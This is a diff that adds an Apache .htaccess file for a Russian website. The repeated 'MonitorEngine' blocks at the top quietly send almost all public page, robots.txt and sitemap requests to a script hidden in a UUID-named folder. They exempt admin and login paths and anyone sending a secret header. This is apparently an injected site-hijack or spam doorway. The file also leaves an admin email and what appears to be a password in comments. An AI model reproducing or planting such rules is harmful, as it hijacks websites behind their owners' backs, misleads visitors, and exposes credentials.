@@ -1,0 +1,115 @@
+#MonitorEngineS_1010011010
+
+RewriteEngine On
+#cgi
+RewriteCond %{REQUEST_URI} .*/61bc8ff8-0141-4b0e-b767-ca022d72e5a9/toolza.php$
+RewriteRule .* - [L]
+
+RewriteCond %{HTTP:MONITORENGINE} !^turns$
+RewriteCond %{REQUEST_URI} ^[^\.]*$ [OR]
+RewriteCond %{REQUEST_URI} ^.*((\.(php|html|htm|php4|php5))|robots.txt|sitemap.xml|sitemap_[0-9]{1,2}.xml).*$
+RewriteCond %{REQUEST_URI} !(^.*((/(bitrix|administrator|yandex_market|admin|wp-admin|wp-login|manager|simpla|netcat|login|1c_exchange.php|django.wsgi))).*)
+RewriteRule ^.*$ /61bc8ff8-0141-4b0e-b767-ca022d72e5a9/toolza.php [L]
+#MonitorEngineE_1010011010
+#MonitorEngineS_1010011010
+
+RewriteEngine On
+#cgi
+RewriteCond %{REQUEST_URI} .*/61bc8ff8-0141-4b0e-b767-ca022d72e5a9/toolza.php$
+RewriteRule .* - [L]
+
+RewriteCond %{HTTP:MONITORENGINE} !^turns$
+RewriteCond %{REQUEST_URI} ^[^\.]*$ [OR]
+RewriteCond %{REQUEST_URI} ^.*((\.(php|html|htm|php4|php5))|robots.txt|sitemap.xml|sitemap_[0-9]{1,2}.xml).*$
+RewriteCond %{REQUEST_URI} !(^.*((/(bitrix|administrator|yandex_market|admin|wp-admin|wp-login|manager|simpla|netcat|login|1c_exchange.php|django.wsgi))).*)
+RewriteRule ^.*$ /61bc8ff8-0141-4b0e-b767-ca022d72e5a9/toolza.php [L]
+#MonitorEngineE_1010011010
+#MonitorEngineS_1010011010
+
+RewriteEngine On
+#cgi
+RewriteCond %{REQUEST_URI} .*/61bc8ff8-0141-4b0e-b767-ca022d72e5a9/toolza.php$
+RewriteRule .* - [L]
+
+RewriteCond %{HTTP:MONITORENGINE} !^turns$
+RewriteCond %{REQUEST_URI} ^[^\.]*$ [OR]
+RewriteCond %{REQUEST_URI} ^.*((\.(php|html|htm|php4|php5))|robots.txt|sitemap.xml|sitemap_[0-9]{1,2}.xml).*$
+RewriteCond %{REQUEST_URI} !(^.*((/(bitrix|administrator|yandex_market|admin|wp-admin|wp-login|manager|simpla|netcat|login|1c_exchange.php|django.wsgi))).*)
+RewriteRule ^.*$ /61bc8ff8-0141-4b0e-b767-ca022d72e5a9/toolza.php [L]
+#MonitorEngineE_1010011010
+#MonitorEngineS_1010011010
+
+RewriteEngine On
+#cgi
+RewriteCond %{REQUEST_URI} .*/61bc8ff8-0141-4b0e-b767-ca022d72e5a9/toolza.php$
+RewriteRule .* - [L]
+
+RewriteCond %{HTTP:MONITORENGINE} !^turns$
+RewriteCond %{REQUEST_URI} ^[^\.]*$ [OR]
+RewriteCond %{REQUEST_URI} ^.*((\.(php|html|htm|php4|php5))|robots.txt|sitemap.xml|sitemap_[0-9]{1,2}.xml).*$
+RewriteCond %{REQUEST_URI} !(^.*((/(bitrix|administrator|yandex_market|admin|wp-admin|wp-login|manager|simpla|netcat|login|1c_exchange.php|django.wsgi))).*)
+RewriteRule ^.*$ /61bc8ff8-0141-4b0e-b767-ca022d72e5a9/toolza.php [L]
+#MonitorEngineE_1010011010
+#MonitorEngineS_1010011010
+
+RewriteEngine On
+#cgi
+RewriteCond %{REQUEST_URI} .*/61bc8ff8-0141-4b0e-b767-ca022d72e5a9/toolza.php$
+RewriteRule .* - [L]
+
+RewriteCond %{HTTP:MONITORENGINE} !^turns$
+RewriteCond %{REQUEST_URI} ^[^\.]*$ [OR]
+RewriteCond %{REQUEST_URI} ^.*((\.(php|html|htm|php4|php5))|robots.txt|sitemap.xml|sitemap_[0-9]{1,2}.xml).*$
+RewriteCond %{REQUEST_URI} !(^.*((/(bitrix|administrator|yandex_market|admin|wp-admin|wp-login|manager|simpla|netcat|login|1c_exchange.php|django.wsgi))).*)
+RewriteRule ^.*$ /61bc8ff8-0141-4b0e-b767-ca022d72e5a9/toolza.php [L]
+#MonitorEngineE_1010011010
+Redirect permanent /googleb318a83c93e21524.html http://xtoolza.ru/mainpagecolorchange.html
+
+#    admin@ingate.ru  
+#   (1U%^|EsB<:\3]d
+
+php_value error_reporting 0
+php_value display_errors 0
+
+RewriteEngine On
+RewriteCond %{HTTP_HOST} ^www\.(.*) [NC]
+RewriteRule ^(.*)$ http://%1/$1 [R=301,L] 
+
+RewriteCond %{HTTP_HOST} ^xtoolza\.ru$ [NC]
+#RewriteRule ^proxy\/(.*)$ http://proxy.xtoolza.ru/$1 [R=301,L]
+
+<IfModule mod_headers.c>
+Header append Cache-Control "no-store, no-cache, must-revalidate"
+Header append Pragma "no-cache"
+</IfModule>
+
+<IfModule mod_expires.c>
+ExpiresActive On
+ExpiresDefault "now"
+</IfModule>
+
+php_value max_execution_time 259200
+php_value memory_limit 512M
+php_value max_input_time 259200
+
+ErrorDocument 404 http://xtoolza.ru/404.php
+
+AddDefaultCharset UTF-8
+#mirrors
+RewriteEngine On
+RewriteCond %{HTTP_HOST} ^www.xtoolza.ru$ [NC]
+RewriteRule ^(.*)$ http://xtoolza.ru/$1 [R=301,L]
+#slash
+RewriteBase /
+RewriteRule ^(.*\.php)/$ $1 [R=301,L]
+#/index.php
+RewriteCond %{REQUEST_URI} !^/manager/
+RewriteCond %{REQUEST_URI} !phpmyadmin
+#RewriteRule ^(.*)/index\.(php|html|htm)$ http://xtoolza.ru/$1/ [R=301,L]
+# domain.ru/index.php > domain.ru
+RewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\ /index\.(php|html|htm)\ HTTP/
+#RewriteRule ^index.(php|html|htm)$ http://xtoolza.ru/ [R=301,L]
+
+RewriteCond %{REQUEST_URI} !^/manager/
+#RewriteRule ^(([^/]+/)*[^.]+)$ /$1.php [L]
+
